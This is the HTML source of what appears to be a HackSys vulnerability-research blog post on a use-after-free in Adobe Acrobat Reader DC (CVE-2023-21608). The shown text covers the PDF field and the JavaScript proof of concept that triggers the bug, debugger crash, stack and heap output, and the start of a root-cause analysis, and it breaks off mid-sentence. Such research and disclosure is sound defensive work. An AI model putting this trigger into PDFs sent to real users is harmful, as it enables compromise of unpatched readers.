<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/569ce4b8f30dc480-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/d8804d28b3f5ce05-s.p.otf" as="font" crossorigin="" type="font/otf"/><link rel="stylesheet" href="/_next/static/css/4dfd5a5264424a0f.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/2a75dc013f3ed419.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-0fbc809f8b0c668c.js"/><script src="/_next/static/chunks/4bd1b696-a23cdecbdc66dd73.js" async=""></script><script src="/_next/static/chunks/1684-68d91d2ebad3f657.js" async=""></script><script src="/_next/static/chunks/main-app-188d9912fd0e5ccf.js" async=""></script><script src="/_next/static/chunks/6874-d043bc3669b11e48.js" async=""></script><script src="/_next/static/chunks/2848-76b38e6c317c0e54.js" async=""></script><script src="/_next/static/chunks/1966-a068e5746165fd6d.js" async=""></script><script src="/_next/static/chunks/2467-7c736c42c91fb3af.js" async=""></script><script src="/_next/static/chunks/214-845c2722ecb73b86.js" async=""></script><script src="/_next/static/chunks/app/layout-f709b6a7dd5adbfc.js" async=""></script><script src="/_next/static/chunks/app/not-found-cbc74e2537bbd3aa.js" async=""></script><script src="/_next/static/chunks/d3ac728e-41fcba63e1ac6655.js" async=""></script><script src="/_next/static/chunks/e0368f7a-1235c34447e61195.js" async=""></script><script src="/_next/static/chunks/1456-5cbd6dd70e2edd95.js" async=""></script><script src="/_next/static/chunks/6877-676b4dd2ee485b26.js" async=""></script><script src="/_next/static/chunks/7882-5f5fc3a912ab1310.js" async=""></script><script src="/_next/static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js" async=""></script><link rel="preload" href="/_next/static/css/09dfadb69bdaa005.css" as="style"/><link rel="preload" href="/_next/static/css/06fcfbe31f4b8e82.css" as="style"/><meta name="next-size-adjust" content=""/><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col"><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/webpack-0fbc809f8b0c668c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:\"$Sreact.suspense\"\n3:I[75989,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"GoogleAnalytics\"]\n4:I[29093,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"PageLoadWrapper\"]\n5:I[2148,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"Header\"]\n6:I[87555,[],\"\"]\n7:I[31295,[],\"\"]\n8:I[32876,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"4345\",\"static/chunks/app/not-found-cbc74e2537bbd3aa.js\"],\"default\"]\n9:I[6874,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"\"]\nc:I[59665,[],\"MetadataBoundary\"]\ne:I[59665,[],\"OutletBoundary\"]\n11:I[74911,[],\"AsyncMetadataOutlet\"]\n13:I[59665,[],\"ViewportBoundary\"]\n15:I[26614,[],\"\"]\n:HL[\"/_next/static/media/569ce4b8f30dc480-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/93f479601ee12b01-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/d8804d28b3f5ce05-s.p.otf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/otf\"}]\n:HL[\"/_next/static/css/4dfd5a5264424a0f.css\",\"style\"]\n:HL[\"/_next/static/css/2a75"])</script><script>self.__next_f.push([1,"dc013f3ed419.css\",\"style\"]\n:HL[\"/_next/static/css/09dfadb69bdaa005.css\",\"style\"]\n:HL[\"/_next/static/css/06fcfbe31f4b8e82.css\",\"style\"]\na:T4ef,M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"gMyW5qIY4BG4upgCzpuGJ\",\"p\":\"\",\"c\":[\"\",\"blogs\",\"adobe-reader-resetform-cagg-rce-cve-2023-21608\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blogs\",{\"children\":[[\"slug\",\"adobe-reader-resetform-cagg-rce-cve-2023-21608\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/4dfd5a5264424a0f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2a75dc013f3ed419.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L3\",null,{}]}]}],[\"$\",\"body\",null,{\"className\":\"__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col\",\"children\":[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L4\",null,{\"children\":[[\"$\",\"$L5\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex-grow container mx-auto pt-24 pb-20\",\"children\":[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"$L8\",null,{}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"fixed left-0 bottom-0 right-0 border-t border-primary/30 bg-background/95 backdrop-blur-sm py-2 px-2 sm:px-4 w-full z-10 print:relative\",\"children\":[\"$\",\"div\",null,{\"className\":\"container mx-auto px-0\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex items-center justify-between w-full\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex-1\",\"children\":[\"$\",\"div\",null,{\"className\":\"text-xs sm:text-sm font-semibold bg-gradient-to-r from-primary/90 to-secondary/90 bg-clip-text text-transparent truncate\",\"children\":[\"Â© \",2025,\" \",\"HackSys Inc\"]}]}],[\"$\",\"div\",null,{\"className\":\"flex items-center gap-3 sm:gap-4 ml-4\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"https://twitter.com/HackSysTeam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Twitter\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"X\"}],[\"$\",\"path\",null,{\"d\":\"M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://github.com/hacksysteam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"GitHub\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"GitHub\"}],[\"$\",\"path\",null,{\"d\":\"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://www.facebook.com/HackSysTeam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Facebook\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"Facebook\"}],[\"$\",\"path\",null,{\"d\":\"M9.101 23.691v-7.98H6.627v-3.667h2.474v-1.58c0-4.085 1.848-5.978 5.858-5.978.401 0 .955.042 1.468.103a8.68 8.68 0 0 1 1.141.195v3.325a8.623 8.623 0 0 0-.653-.036 26.805 26.805 0 0 0-.733-.009c-.707 0-1.259.096-1.675.309a1.686 1.686 0 0 0-.679.622c-.258.42-.374.995-.374 1.752v1.297h3.919l-.386 2.103-.287 1.564h-3.246v8.245C19.396 23.238 24 18.179 24 12.044c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.628 3.874 10.35 9.101 11.647Z\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://discord.com/invite/ns32uNhaq7\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Discord\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"Discord\"}],[\"$\",\"path\",null,{\"d\":\"$a\"}]]}]}]]}]]}]}]}]]}]}]}]]}]]}],{\"children\":[\"blogs\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"adobe-reader-resetform-cagg-rce-cve-2023-21608\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$Lb\",[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/09dfadb69bdaa005.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/06fcfbe31f4b8e82.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$Le\",null,{\"children\":[\"$Lf\",\"$L10\",[\"$\",\"$L11\",null,{\"promise\":\"$@12\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"mlZ_o5HVmCFjsMPvwDYQb\",{\"children\":[[\"$\",\"$L13\",null,{\"children\":\"$L14\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$15\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"16:I[74911,[],\"AsyncMetadata\"]\n18:I[88793,[\"7330\",\"static/chunks/d3ac728e-41fcba63e1ac6655.js\",\"5661\",\"static/chunks/e0368f7a-1235c34447e61195.js\",\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"1456\",\"static/chunks/1456-5cbd6dd70e2edd95.js\",\"6877\",\"static/chunks/6877-676b4dd2ee485b26.js\",\"7882\",\"static/chunks/7882-5f5fc3a912ab1310.js\",\"3744\",\"static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js\"],\"HeroSection\"]\n19:I[750,[\"7330\",\"static/chunks/d3ac728e-41fcba63e1ac6655.js\",\"5661\",\"static/chunks/e0368f7a-1235c34447e61195.js\",\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"1456\",\"static/chunks/1456-5cbd6dd70e2edd95.js\",\"6877\",\"static/chunks/6877-676b4dd2ee485b26.js\",\"7882\",\"static/chunks/7882-5f5fc3a912ab1310.js\",\"3744\",\"static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js\"],\"default\"]\nd:[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L16\",null,{\"promise\":\"$@17\"}]}]\n1a:Tddd8,"])</script><script>self.__next_f.push([1,"\n## Overview\n\nIn the **third** part of the **PDF Reader** series, we are going to see how we exploited a **use-after-free** vulnerability in **Adobe Acrobat Reader DC**. The bug was found during our fuzzing campaign targeting popular **PDF readers**. We were able to successfully exploit this vulnerability to gain **Remote Code Execution** in the context of **Adobe Acrobat Reader**.\n\nWe have already shared **2 parts** of the series, where we exploited **Adobe Reader** for **Information Leaks** and **Foxit PDF Reader** for **Remote Code Execution (RCE)**. Both parts are linked below so that you can read more about them.\n\n1. [Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067](https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak)\n2. [Foxit PDF Reader - Use after Free - Remote Code Execution Exploit (RCE) - CVE-2022-28672](https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672)\n\n\u003e **Info:** [**Zero Day Initiative (ZDI)**](https://www.zerodayinitiative.com/) acquired both the **vulnerability** and the **exploit**.\n\n## Advisory\n\n- [CVE-2023-21608](https://hacksys.io/advisories/HI-2022-006)\n\n## Testbed\n\n- OS edition: **Windows 10 Pro 20H2 19042.804**\n- Product: **Adobe Acrobat Reader DC 2022.003.20258**\n- Product URL: \u003chttps://get.adobe.com/reader/otherversions/\u003e\n\n## Proof of Concept\n\nThe test case contains a static **text field** named `testField` embedded inside a **PDF** document.\n\n```\n5 0 obj\n\u003c\u003c\n/Type /Annot\n/Subtype /Widget\n/T (testField)\n/FT /Tx\n/Rect [0 0 0 0]\n\u003e\u003e\n```\n\nBelow given is the relevant **JavaScript** part that triggers the bug.\n\n```js\nvar testField = this.getField(\"testField\");\n\ntestField.richText = true;\ntestField.setAction(\"Calculate\", \"calculateCallback()\");\n\ntry { this.resetForm(); } catch (e) {}\ntry { this.resetForm(); } catch (e) {}  // bug is triggered during this resetForm call\n\nfunction calculateCallback()\n{\n  event.__defineGetter__(\"target\", getterFunc);\n  event.richValue = this;\n}\n\nfunction getterFunc()\n{\n  try { Object.defineProperty(testField, \"textFont\", { value: this }); } catch(e) { }\n}\n```\n\n## Crash State\n\nEnable **page-heap** for `AcroRd32.exe` and open the `crash.pdf` file with **Acrobat Adobe Reader DC**.\n\n```\neax=04f6a0f0 ebx=00000000 ecx=420fefd0 edx=44e1cff8 esi=6921ef50 edi=420fefd0\neip=6c556b99 esp=04f6a0d0 ebp=04f6a0fc iopl=0         nv up ei pl nz na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206\nAcroForm!CAgg::operator[](unsigned short)+0xe:\n6c556b99 8b07            mov     eax,dword ptr [edi]  ds:002b:420fefd0=????????\n```\n\n\u003e **Note:** All analysis and exploitation outlined in this post is done on **Adobe Acrobat Reader DC** version **2022.001.20085 x86**.\n\n### Stack Trace\n\n```\n0:000\u003e kb\n # ChildEBP RetAddr      Args to Child\n00 04f6a0fc 6c552a50     00001742 408bcff0 00000000 AcroForm!CAgg::operator[](unsigned short)+0xe\n01 04f6a118 6bdfd922     43a38fb8 527e4ff0 408bcff0 AcroForm!EScript_ESObjectEnum_CallbackProc+0x30\n02 04f6a16c 6bdfd803     43a38fb8 6c552a20 04f6a1c8 EScript!ESObjectEnum+0xc3\n03 04f6a184 692fe993     43a38fb8 6c552a20 04f6a1c8 EScript!ESObjectEnumWrapper+0x13\nWARNING: Stack unwind information not available. Following frames may be wrong.\n04 04f6a19c 6c55298c     43a38fb8 6c552a20 04f6a1c8 AcroRd32!DllCanUnloadNow+0xa6553\n05 04f6a1e4 6c552c3f     420fefd0 43a38fb8 00000000 AcroForm!ESValToCAgg_internal+0x447\n06 04f6a20c 6c552a56     420fefd0 46ed4ff0 00000000 AcroForm!ESValToCAgg(CAgg \u0026, _s_ESValRec *, unsigned short)+0xd6\n07 04f6a228 6bdfd922     503d4fb8 45970ff0 46ed4ff0 AcroForm!EScript_ESObjectEnum_CallbackProc+0x36\n08 04f6a27c 6bdfd803     503d4fb8 6c552a20 04f6a2d8 EScript!ESObjectEnum+0xc3\n09 04f6a294 692fe993     503d4fb8 6c552a20 04f6a2d8 EScript!ESObjectEnumWrapper+0x13\n0a 04f6a2ac 6c55298c     503d4fb8 6c552a20 04f6a2d8 AcroRd32!DllCanUnloadNow+0xa6553\n0b 04f6a2f4 6c552c3f     505fafd0 503d4fb8 00000000 AcroForm!ESValToCAgg_internal+0x447\n0c 04f6a31c 6c552a56     505fafd0 3d259ff0 00000000 AcroForm!ESValToCAgg(CAgg \u0026, _s_ESValRec *, unsigned short)+0xd6\n0d 04f6a338 6bdfd922     4e5dcfb8 4948eff0 3d259ff0 AcroForm!EScript_ESObjectEnum_CallbackProc+0x36\n0e 04f6a38c 6bdfd803     4e5dcfb8 6c552a20 04f6a3e8 EScript!ESObjectEnum+0xc3\n0f 04f6a3a4 692fe993     4e5dcfb8 6c552a20 04f6a3e8 EScript!ESObjectEnumWrapper+0x13\n10 04f6a3bc 6c55298c     4e5dcfb8 6c552a20 04f6a3e8 AcroRd32!DllCanUnloadNow+0xa6553\n11 04f6a404 6c552c3f     04f6afa8 4e5dcfb8 00000000 AcroForm!ESValToCAgg_internal+0x447\n12 04f6a42c 6c552aea     04f6afa8 47cf6ff0 00000000 AcroForm!ESValToCAgg(CAgg \u0026, _s_ESValRec *, unsigned short)+0xd6\n13 04f6a46c 6c513b35     04f6afa8 47cf6ff0 00000000 AcroForm!ESValToCAggWrapper+0x1e\n14 04f6a4c8 6bddf79b     48cf2fb8 45230ff0 47cf6ff0 AcroForm!SetRichValueEventProp+0x1f5\n15 04f6a534 6bddf5bc     3cdaef58 04f6a68c 04f6a568 EScript!sub_1003F620+0x17b\n16 04f6a56c 6bdba592     3cdaef58 04f6a68c 04f6a68c EScript!sub_1003F4E7+0xd5\n17 04f6a5a4 6bdba2fe     3cdaef58 04f6a68c 04f6a68c EScript!sub_1001A4D2+0xc0\n18 04f6a64c 6bdd8a6b     3cdaef58 04f6a68c 04f6a68c EScript!sub_10019E93+0x46b\n19 04f6a690 6bdd4cd7     3cdaef58 04f6aac0 4fdc2fcf EScript!sub_100389D2+0x99\n1a 04f6ab00 6bdd246b     3cd5da60 6bdd24c0 00000438 EScript!js_Interpret+0x2828\n1b 04f6ab4c 6bdd237b     3cdaef58 04f6ab60 3cdaef58 EScript!sub_10032412+0x59\n1c 04f6ab88 6bdd22b0     3cdaef58 04f6abfc 3d1a4100 EScript!sub_10032315+0x66\n1d 04f6abbc 6bdbb6b0     3cdaef58 04f6abfc 3d1a4100 EScript!js_Execute+0x7d\n1e 04f6ac0c 6bdfa9c6     3cdaef58 04f6ac8c 00000000 EScript!JS_EvaluateUCScriptForPrincipals+0x8b\n1f 04f6ac90 6bdfa6cb     3cdaef58 3d1a4100 4c93efd8 EScript!JS_EvaluateUCScript+0x4d\n20 04f6ae44 6bdfa046     3d4f9ff0 49488fe0 49f3cff0 EScript!ESExecScript+0x10b\n21 04f6ae90 6bdf8e23     3cdacfc0 390b4fb8 49d20fc0 EScript!AESEvaluateScript+0x3d\n22 04f6af30 692fcbdf     1f2c0bd0 390b4fb8 49cf4fc0 EScript!ESExecuteScriptWithEvent+0x4a3\n23 04f6af58 6c543fd4     1f2c0bd0 00000000 49cf4fc0 AcroRd32!DllCanUnloadNow+0xa479f\n24 04f6b03c 6c543270     1f2c0bd0 5135cfa0 00000000 AcroForm!AFCalculateNthFieldEntry_x+0x4b8\n25 04f6b074 6c545f65     1f2c0bd0 00000000 00001467 AcroForm!AFPDCalculateFields__internal+0xfd\n26 04f6b0b0 6c5c4c37     1f2c0bd0 00000000 1f2c0bd0 AcroForm!AFPDCalculateFields+0x9f\n27 04f6b1b0 6c50fa1c     1f2c0bd0 00000000 00000000 AcroForm!ResetForm(_t_PDDoc *, OPAQUE_64_BITS, unsigned short)+0x477\n28 04f6b65c 6bdf3fb7     390b4fb8 45fe4ff0 5225afb8 AcroForm!resetFormHandler+0x5fc\n```\n\nA quick verification using the `!heap` command reveals that this is a **use-after-free** vulnerability.\n\n```\n0:000\u003e !ext.heap -p -a @edi\n    address 420fefd0 found in\n    _DPH_HEAP_ROOT @ 7831000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                   372134ac:         420fe000             2000\n    6e44ab02 verifier!AVrfDebugPageHeapFree+0x000000c2\n    770af766 ntdll!RtlDebugFreeHeap+0x0000003e\n    770668ae ntdll!RtlpFreeHeap+0x0004e0ce\n    770562ed ntdll!RtlpFreeHeapInternal+0x00000783\n    77018786 ntdll!RtlFreeHeap+0x00000046\n    755d3c9b ucrtbase!_free_base+0x0000001b\n    755d3c68 ucrtbase!free+0x00000018\n    6c2e7a56 AcroForm!operator delete(void *)+0x0000000b\n    6c555f05 AcroForm!sub_20AD5ECD+0x00000038\n    6c555e5f AcroForm!sub_20AD5E3B+0x00000024\n    6c555e54 AcroForm!sub_20AD5E3B+0x00000019\n    6c555e1b AcroForm!sub_20AD5DE9+0x00000032\n    6c557abf AcroForm!CAgg::convertASAtommap(bool (\u0026)[27])+0x000002e0\n    6c557559 AcroForm!CAgg::convert(bool (\u0026)[27])+0x000000e7\n    6c5576c0 AcroForm!CAgg::convert(CAgg::CAggType)+0x00000045\n    6c556d10 AcroForm!sub_20AD6CDD+0x00000033\n    6c555efd AcroForm!sub_20AD5ECD+0x00000030\n    6c555e5f AcroForm!sub_20AD5E3B+0x00000024\n    6c555e54 AcroForm!sub_20AD5E3B+0x00000019\n    6c555e54 AcroForm!sub_20AD5E3B+0x00000019\n    6c555e1b AcroForm!sub_20AD5DE9+0x00000032\n    6c557abf AcroForm!CAgg::convertASAtommap(bool (\u0026)[27])+0x000002e0\n    6c557559 AcroForm!CAgg::convert(bool (\u0026)[27])+0x000000e7\n    6c55766d AcroForm!sub_20AD75F2+0x0000007b\n    6c551b9e AcroForm!CAggConvertToESValType(CAgg \u0026)+0x0000001f\n    6c551be0 AcroForm!CAggToESVal(_s_ESValRec *, CAgg \u0026)+0x0000003d\n    6c5131ce AcroForm!GetRichValueEventProp+0x0000011e\n    6bdde176 EScript!sub_1003DF10+0x00000266\n    6bde306d EScript!sub_10042FE8+0x00000085\n    6bdb50fd EScript!sub_10014B57+0x000005a6\n    6bdb4b4a EScript!sub_10014B17+0x00000033\n    6bdddcd2 EScript!sub_1003DC6A+0x00000068\n```\n\nAt this stage, with the above initial analysis in hand, we decided to deep dive into analyzing the root cause of this bug and see if we could exploit it to achieve **RCE** in **Adobe Reader's** sandbox process.\n\n## Root Cause Analysis\n\nA couple of things to note in this PoC\n\n- The bug occurs during the **second call** to the `resetForm`\n- `resetForm` invokes **calculate** events on all fields if a `Calculate` handler is defined\n- In the `Calculate` handler, the `event` object's `target` property is **overridden** with a **user-defined** function `getterFunc`\n- Inside this `getterFunc` function, the `textFont` property of the **field** is **redefined** with the value of the `doc` object\n- This causes a crash when the `event.richValue = this` assignment is executed in the `Calculate` handler\n\nThe crash can be traced back through the **call stack** to the responsible call hierarchy.\n\n```\nAcroForm!ResetForm                             | this.resetForm()\n  AcroForm!AFPDCalculateFields\n    AcroForm!AFCalculateNthFieldEntry\n      AcroForm!AFCalculateNthFieldEntry\n    AcroForm!AFCalculateNthFieldEntry\n      |- user defined callback is triggered.   | field Calculate handler invoked\n        AcroForm!SetRichValueEventProp         | event.richValue = this\n\n        .. some form of aggregation starts on richValue ..\n\n          AcroForm!EScript_ESObjectEnum_CallbackProc\n            AcroForm!CAgg::operator[](unsigned short)\n```\n\nThe bug occurs when some form of value **aggregation** starts inside `SetRichValueEventProp`, which enumerates the assigned object `this`, which is an instance of the current `doc` object.\n\nThe properties and methods of `doc` are enumerated **recursively** using 